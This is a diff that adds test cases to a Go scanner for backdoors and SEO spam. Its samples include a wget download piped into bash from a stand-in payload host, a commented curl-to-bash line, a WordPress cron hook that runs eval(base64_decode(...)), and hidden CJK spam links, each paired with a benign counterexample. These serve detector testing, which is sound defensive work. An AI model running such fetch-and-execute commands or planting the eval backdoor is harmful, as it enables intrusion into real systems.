@@ -340,6 +340,51 @@ $out = shell_exec($cmd);`,
 			rule:   "backdoor_htmlmode_eval",
 			sample: `<?php $url = 'https://api.example.test/data'; $content = curl_exec($ch);`,
 		},
+		{
+			name:   "download piped to a shell through an intermediate command",
+			rule:   "dropper_wget_exec",
+			want:   true,
+			sample: "wget http://payload.example.test/p | tee /tmp/p | bash\n",
+		},
+		{
+			name:   "commented-out download pipeline",
+			rule:   "dropper_wget_exec",
+			sample: "# curl http://payload.example.test/p.sh | bash\n",
+		},
+		{
+			name:   "scheduled event running an obfuscated payload",
+			rule:   "wp_cron_backdoor",
+			want:   true,
+			sample: "<?php wp_schedule_event(time(),'hourly','x'); eval(base64_decode($p));\n",
+		},
+		{
+			name:   "scheduled event calling a local maintenance function",
+			rule:   "wp_cron_backdoor",
+			sample: "<?php wp_schedule_event(time(),'hourly','my_task');\nfunction my_task(){ update_option('x',1); }\n",
+		},
+		{
+			// The rule needs >= 10 CJK codepoints next to a link, hidden by CSS.
+			name:   "hidden block of CJK keywords wrapping a link",
+			rule:   "spam_chinese_seo",
+			want:   true,
+			sample: `<div style="display:none">` + strings.Repeat("\u4e2d\u6587\u5185\u5bb9", 4) + ` <a href="https://spam.example.test/x">x</a></div>`,
+		},
+		{
+			name:   "visible CJK content linking out",
+			rule:   "spam_chinese_seo",
+			sample: `<div>` + strings.Repeat("\u4e2d\u6587\u5185\u5bb9", 4) + ` <a href="https://ok.example.test/x">x</a></div>`,
+		},
+		{
+			name:   "kana keyword stuffing beside pharma spam",
+			rule:   "spam_japanese_seo",
+			want:   true,
+			sample: `<p>` + strings.Repeat("\u3042\u3044\u3046\u3048\u304a", 3) + ` viagra online</p>`,
+		},
+		{
+			name:   "ordinary kana paragraph",
+			rule:   "spam_japanese_seo",
+			sample: `<p>` + strings.Repeat("\u3042\u3044\u3046\u3048\u304a", 3) + ` normal content</p>`,
+		},
 	}
 
 	for _, tc := range tests {
